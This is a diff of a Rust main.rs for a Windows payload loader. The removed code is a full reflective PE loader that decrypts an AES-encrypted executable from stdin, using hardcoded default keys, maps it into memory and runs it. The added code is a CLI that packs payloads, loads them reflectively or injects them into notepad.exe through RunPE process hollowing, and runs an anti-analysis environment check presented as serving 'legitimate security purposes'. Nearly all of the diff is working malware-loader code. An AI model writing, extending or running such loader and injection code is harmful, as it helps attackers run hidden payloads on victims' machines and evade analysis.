@@ -1,314 +1,172 @@
-#[cfg(target_os = "windows")]
 use std::io::Read;
-#[cfg(target_os = "windows")]
-use std::mem::{size_of, transmute};
-#[cfg(target_os = "windows")]
-use std::ptr::{copy_nonoverlapping, null_mut, write_bytes};
-#[cfg(target_os = "windows")]
-use std::slice;
+use std::path::PathBuf;
+use std::fs;
+use anyhow::{Result, Context};
+use log::{info, warn, error};
 
-#[cfg(target_os = "windows")]
-use aes::Aes256;
-#[cfg(target_os = "windows")]
-use cbc::Decryptor;
-#[cfg(target_os = "windows")]
-use cbc::cipher::{
-    BlockDecryptMut,
-    block_padding::Pkcs7,
-    KeyIvInit, // Trait that provides .new_from_slices()
-};
-
-#[cfg(target_os = "windows")]
-use windows_sys::Win32::System::Diagnostics::Debug::{
-    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
-    IMAGE_FILE_MACHINE_AMD64, IMAGE_OPTIONAL_HEADER64, IMAGE_SECTION_HEADER,
-    IMAGE_BASE_RELOCATION, IMAGE_IMPORT_DESCRIPTOR, IMAGE_IMPORT_BY_NAME,
-    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC,
-    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_DIR64,
-};
-
-#[cfg(target_os = "windows")]
-use windows_sys::Win32::System::Memory::{
-    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
-    PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
-};
-
-#[cfg(target_os = "windows")]
-use windows_sys::Win32::System::LibraryLoader::{
-    LoadLibraryA, GetProcAddress
-};
-
-#[cfg(target_os = "windows")]
-const DEFAULT_AES_KEY: [u8; 32] = *b"ThisIs32BytesOfAKeyForAES-256!!"; // 32 bytes
-#[cfg(target_os = "windows")]
-const DEFAULT_AES_IV:  [u8; 16] = *b"16BytesOfInitVec";                // 16 bytes
-
-#[cfg(target_os = "windows")]
-fn get_aes_key() -> [u8; 32] {
-    match std::env::var("AES_KEY") {
-        Ok(key) => {
-            if key.len() == 32 {
-                let mut result = [0u8; 32];
-                result.copy_from_slice(key.as_bytes());
-                result
-            } else {
-                eprintln!("Warning: AES_KEY environment variable is not 32 bytes. Using default key.");
-                DEFAULT_AES_KEY
-            }
-        },
-        Err(_) => {
-            eprintln!("Warning: AES_KEY environment variable not found. Using default key.");
-            DEFAULT_AES_KEY
-        }
-    }
-}
-
-#[cfg(target_os = "windows")]
-fn get_aes_iv() -> [u8; 16] {
-    match std::env::var("AES_IV") {
-        Ok(iv) => {
-            if iv.len() == 16 {
-                let mut result = [0u8; 16];
-                result.copy_from_slice(iv.as_bytes());
-                result
-            } else {
-                eprintln!("Warning: AES_IV environment variable is not 16 bytes. Using default IV.");
-                DEFAULT_AES_IV
-            }
-        },
-        Err(_) => {
-            eprintln!("Warning: AES_IV environment variable not found. Using default IV.");
-            DEFAULT_AES_IV
-        }
-    }
-}
-
-#[cfg(target_os = "windows")]
-fn main() {
-    println!("Reflective Loader Demo - No CreateThread variant");
-    let mut encrypted_data = Vec::new();
-    std::io::stdin().read_to_end(&mut encrypted_data)
-        .expect("Failed to read from stdin");
-
-    if encrypted_data.is_empty() {
-        eprintln!("No input data received. Exiting.");
-        return;
-    }
-
-    println!("Decrypting payload...");
-    let aes_key = get_aes_key();
-    let aes_iv = get_aes_iv();
-    let mut decrypted_payload = match decrypt_aes256_cbc(&encrypted_data, &aes_key, &aes_iv) {
-        Ok(p) => p,
-        Err(e) => {
-            eprintln!("Decryption error: {}", e);
-            return;
-        }
-    };
-
-    let dos_header = unsafe { &*(decrypted_payload.as_ptr() as *const IMAGE_DOS_HEADER) };
-    if dos_header.e_magic != IMAGE_DOS_SIGNATURE as u16 {
-        eprintln!("Not a valid PE file (MZ signature not found).");
-        return;
-    }
-
-    let nt_headers_offset = dos_header.e_lfanew as usize;
-    let nt_header_64 = unsafe {
-        &*(decrypted_payload.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS64)
-    };
-    if nt_header_64.Signature != IMAGE_NT_SIGNATURE {
-        eprintln!("Invalid PE signature.");
-        return;
-    }
-    if nt_header_64.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 {
-        eprintln!("This demo loader only supports 64-bit AMD64 PEs.");
-        return;
-    }
-
-    let opt_header = &nt_header_64.OptionalHeader;
-    let image_size = opt_header.SizeOfImage as usize;
-    let entry_rva  = opt_header.AddressOfEntryPoint as usize;
-    let preferred_base = opt_header.ImageBase as usize;
-
-    let alloc_base = unsafe {
-        VirtualAlloc(
-            null_mut(),
-            image_size,
-            MEM_RESERVE | MEM_COMMIT,
-            PAGE_READWRITE,
-        )
-    };
-    if alloc_base.is_null() {
-        eprintln!("VirtualAlloc failed. Aborting.");
-        return;
-    }
-
-    unsafe {
-        copy_nonoverlapping(
-            decrypted_payload.as_ptr(),
-            alloc_base as *mut u8,
-            opt_header.SizeOfHeaders as usize,
-        );
-    }
-
-    let num_sections = nt_header_64.FileHeader.NumberOfSections as usize;
-    let section_header_ptr = unsafe {
-        decrypted_payload.as_ptr()
-            .add(nt_headers_offset)
-            .add(size_of::<IMAGE_NT_HEADERS64>())
-    } as *const IMAGE_SECTION_HEADER;
-
-    let sections = unsafe { slice::from_raw_parts(section_header_ptr, num_sections) };
-    for sect in sections {
-        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
-        let raw_size = sect.SizeOfRawData as usize;
-        let virt_size = sect.Misc.VirtualSize as usize;
-
-        if raw_size > 0 {
-            let src_ptr = decrypted_payload.as_ptr().add(sect.PointerToRawData as usize);
-            unsafe {
-                copy_nonoverlapping(src_ptr, dest_ptr, raw_size);
-            }
-        }
-        if virt_size > raw_size {
-            unsafe {
-                write_bytes(
-                    dest_ptr.add(raw_size),
-                    0,
-                    virt_size - raw_size,
-                );
-            }
-        }
-    }
-
-    if opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress != 0 {
-        if let Err(e) = resolve_imports(alloc_base as usize, opt_header) {
-            eprintln!("Import resolution error: {}", e);
-            return;
-        }
-    }
-
-    if let Err(e) = apply_relocations(alloc_base as usize, preferred_base, opt_header) {
-        eprintln!("Relocation error: {}", e);
-        return;
-    }
-
-    if let Err(e) = set_section_permissions(alloc_base as usize, &sections, opt_header) {
-        eprintln!("Failed to set section protections: {}", e);
-        return;
-    }
-
-    unsafe {
-        let mut old_protect = 0;
-        VirtualProtect(
-            alloc_base,
-            opt_header.SizeOfHeaders as usize,
-            PAGE_READONLY,
-            &mut old_protect,
-        );
-    }
-
-    let entry_point = alloc_base as usize + entry_rva;
-    println!("Calling entry point at: 0x{:X}", entry_point);
-    unsafe {
-        let entry_fn: extern "system" fn() -> i32 = transmute(entry_point);
-        let exit_code = entry_fn();
-        println!("Payload returned exit code: {}", exit_code);
-    }
-
-    for b in &mut decrypted_payload {
-        *b = 0;
-    }
-}
-
-#[cfg(not(target_os = "windows"))]
 mod protection;
+mod gpu_packer;
+mod reflective_loader;
+mod runpe;
+mod cli;
 
-#[cfg(not(target_os = "windows"))]
-fn main() {
-    println!("This reflective loader is designed to run on Windows only.");
-    println!("It contains Windows-specific code that cannot run on this platform.");
-    println!("Please compile and run this on a Windows machine.");
+#[cfg(test)]
+mod tests;
+
+fn main() -> Result<(), anyhow::Error> {
+    env_logger::init();
+    info!("Reflective Loader starting up");
     
-    println!("\nDemonstrating secure key generation:");
-    match protection::key_generator::generate_aes256_key() {
-        Ok(key) => {
-            println!("Generated AES-256 key: {:?}", key);
-            println!("Key length: {} bytes", key.len());
+    let cli_args = cli::parse_args();
+    
+    if cli_args.verbose {
+        info!("Verbose mode enabled");
+    }
+    
+    match cli_args.command {
+        cli::Commands::Pack(args) => {
+            info!("Packing file: {:?} -> {:?}", args.input, args.output);
+            
+            let config = gpu_packer::PackerConfig {
+                device_index: args.gpu_device,
+                segment_size: args.segment_size,
+                iterations: args.iterations,
+                use_encryption: !args.no_encryption,
+            };
+            
+            gpu_packer::pack_file(args.input, args.output, &config)
+                .with_context(|| format!("Failed to pack file: {:?}", args.input))?;
+            
+            info!("File packed successfully");
         },
-        Err(e) => println!("Error generating key: {}", e),
-    }
-    
-    match protection::key_generator::generate_aes_iv() {
-        Ok(iv) => {
-            println!("Generated AES IV: {:?}", iv);
-            println!("IV length: {} bytes", iv.len());
+        
+        cli::Commands::Unpack(args) => {
+            info!("Unpacking file: {:?} -> {:?}", args.input, args.output);
+            
+            gpu_packer::unpack_file(args.input, args.output)
+                .with_context(|| format!("Failed to unpack file: {:?}", args.input))?;
+            
+            info!("File unpacked successfully");
         },
-        Err(e) => println!("Error generating IV: {}", e),
-    }
-    
-    println!("\nPerforming environment analysis for legitimate security purposes:");
-    let analysis = protection::anti_analysis::analyze_environment();
-    println!("Analysis detected suspicious environment: {}", analysis.detected);
-    if analysis.detected {
-        println!("Detections:");
-        for detection in &analysis.detections {
-            println!("  - {:?}", detection);
-        }
-    } else {
-        println!("No suspicious environment detected.");
-    }
-    
-    println!("\nDemonstrating secure file loading mechanism:");
-    println!("This mechanism keeps files encrypted on disk and only decrypts them in memory when needed.");
-    
-    let temp_dir = std::env::temp_dir();
-    let demo_file_path = temp_dir.join("demo_encrypted.bin");
-    
-    println!("Creating a demo encrypted file at: {:?}", demo_file_path);
-    
-    let _demo_key = match protection::key_generator::generate_aes256_key() {
-        Ok(key) => {
-            println!("Generated secure AES-256 key for file encryption");
-            key
+        
+        cli::Commands::ListGpus => {
+            info!("Listing available GPU devices");
+            
+            #[cfg(feature = "gpu-packing")]
+            {
+                match gpu_packer::list_gpu_devices() {
+                    Ok(devices) => {
+                        println!("Available GPU devices:");
+                        for device in devices {
+                            println!("  {}", device);
+                        }
+                    },
+                    Err(e) => {
+                        warn!("Failed to list GPU devices: {}", e);
+                        println!("No GPU devices available for acceleration");
+                    }
+                }
+            }
+            
+            #[cfg(not(feature = "gpu-packing"))]
+            {
+                println!("GPU packing feature not enabled");
+                println!("Compile with --features gpu-packing to enable GPU acceleration");
+            }
         },
-        Err(e) => {
-            println!("Error generating key: {}", e);
-            return;
-        }
-    };
-    
-    let _demo_iv = match protection::key_generator::generate_aes_iv() {
-        Ok(iv) => {
-            println!("Generated secure AES IV for file encryption");
-            iv
+        
+        cli::Commands::Run(args) => {
+            info!("Running file: {:?}", args.input);
+            
+            #[cfg(target_os = "windows")]
+            {
+                if args.runpe {
+                    info!("Using RUNPE injection");
+                    
+                    let target_path = args.target.unwrap_or_else(|| {
+                        PathBuf::from("C:\\Windows\\System32\\notepad.exe")
+                    });
+                    
+                    let config = runpe::RunPeConfig {
+                        target_path: target_path.to_string_lossy().to_string(),
+                        arguments: args.args,
+                        auto_resume: !args.no_auto_resume,
+                    };
+                    
+                    let pe_data = fs::read(&args.input)
+                        .with_context(|| format!("Failed to read file: {:?}", args.input))?;
+                    
+                    let process_id = runpe::inject_pe(&pe_data, &config)
+                        .with_context(|| "RUNPE injection failed")?;
+                    
+                    info!("RUNPE injection successful, process ID: {}", process_id);
+                } else {
+                    info!("Using reflective loading");
+                    
+                    let file_data = fs::read(&args.input)
+                        .with_context(|| format!("Failed to read file: {:?}", args.input))?;
+                    
+                    if file_data.len() >= 8 && &file_data[0..8] == b"GPUPACKED" {
+                        info!("Detected packed file, using GPU packer loader");
+                        
+                        let exit_code = gpu_packer::load_packed_executable_from_memory(
+                            &file_data,
+                            None, // Use CPU unpacking by default
+                        ).with_context(|| "Failed to load packed executable")?;
+                        
+                        info!("Packed executable returned exit code: {}", exit_code);
+                    } else if file_data.len() >= 2 && &file_data[0..2] == b"MZ" {
+                        info!("Detected PE file, using reflective loader");
+                        
+                        let exit_code = reflective_loader::load_pe(&file_data)
+                            .with_context(|| "Failed to load PE file")?;
+                        
+                        info!("PE file returned exit code: {}", exit_code);
+                    } else {
+                        info!("Attempting to decrypt and load file");
+                        
+                        let key = reflective_loader::get_aes_key();
+                        let iv = reflective_loader::get_aes_iv();
+                        
+                        let exit_code = reflective_loader::load_encrypted_pe(&file_data, &key, &iv)
+                            .with_context(|| "Failed to decrypt and load file")?;
+                        
+                        info!("Encrypted file returned exit code: {}", exit_code);
+                    }
+                }
+            }
+            
+            #[cfg(not(target_os = "windows"))]
+            {
+                error!("Reflective loading is only supported on Windows");
+                println!("This feature is only available on Windows");
+                println!("Please compile and run this on a Windows machine");
+                
+                println!("\nDemonstrating secure key generation:");
+                match protection::key_generator::generate_aes256_key() {
+                    Ok(key) => {
+                        println!("Generated AES-256 key: {:?}", key);
+                        println!("Key length: {} bytes", key.len());
+                    },
+                    Err(e) => println!("Error generating key: {}", e),
+                }
+                
+                println!("\nPerforming environment analysis for legitimate security purposes:");
+                let analysis = protection::anti_analysis::analyze_environment();
+                println!("Analysis detected suspicious environment: {}", analysis.detected);
+                if analysis.detected {
+                    println!("Detections:");
+                    for detection in &analysis.detections {
+                        println!("  - {:?}", detection);
+                    }
+                } else {
+                    println!("No suspicious environment detected.");
+                }
+            }
         },
-        Err(e) => {
-            println!("Error generating IV: {}", e);
-            return;
-        }
-    };
-    
-    let demo_content = b"This is a demonstration of secure file loading. In a real implementation, this would be encrypted with AES-256-CBC.";
-    if let Err(e) = std::fs::write(&demo_file_path, demo_content) {
-        println!("Error writing demo file: {}", e);
-        return;
     }
     
-    println!("Demo file created successfully.");
-    println!("In a real implementation, we would load and decrypt this file using:");
-    println!("  let protected_file = protection::file_loader::load_encrypted_file(");
-    println!("      \"{:?}\",", demo_file_path);
-    println!("      &key,");
-    println!("      &iv,");
-    println!("  );");
-    println!("The file would remain encrypted on disk and only be decrypted in memory.");
-    println!("When done with the file, its memory would be securely wiped.");
-    
-    if let Err(e) = std::fs::remove_file(&demo_file_path) {
-        println!("Warning: Could not remove demo file: {}", e);
-    }
+    Ok(())
 }
 
 #[cfg(target_os = "windows")]
